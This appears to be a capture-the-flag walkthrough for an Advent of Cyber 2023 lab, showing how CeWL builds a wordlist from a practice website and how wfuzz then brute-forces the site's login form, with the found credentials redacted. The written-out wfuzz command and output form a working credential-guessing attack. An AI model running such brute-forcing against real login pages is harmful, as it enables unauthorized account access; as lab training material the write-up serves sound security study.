# AoC 2023 - Day 4

> `Brute-forcing` Baby, it's CeWLd outside

## Learning Objectives
> - What is `CeWL`?
> - What are the capabilities of `CeWL`?
> - How can we leverage `CeWL` to generate a custom wordlist from a website?
> - How can we customise the tool's output for specific tasks?

## Steps

```bash
└─$ export box=10.10.208.167
└─$ firefox $box
```

AntarctiCrafts webside is shown.

### Generating a `wordlist` based on the contents of the website.
```bash
└─$ cewl $box -w output.txt
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

### Employee Portal
Using the list of employees from the `/team` page and the generated wordlist, I can try brute-forcing the login form.

```bash
└─$ wfuzz -c -z file,files/usernames.txt -z file,files/output.txt --hs "Please enter the correct credentials" -u $box/login.php -d "username=FUZZ&password=FUZ2Z"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.208.167/login.php
Total requests: 2124

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000696:   302        118 L    297 W      4442 Ch     "{REDACTED}"

Total time: 7.878680
Processed Requests: 2124
Filtered Requests: 2123
Requests/sec.: 269.5882
```

## Question 1

> What is the correct username and password combination? Format username:password

Output is given from `wfuzz`.

## Question 2

> What is the flag?

The flag is found in the `Webmail` part of the employee portal.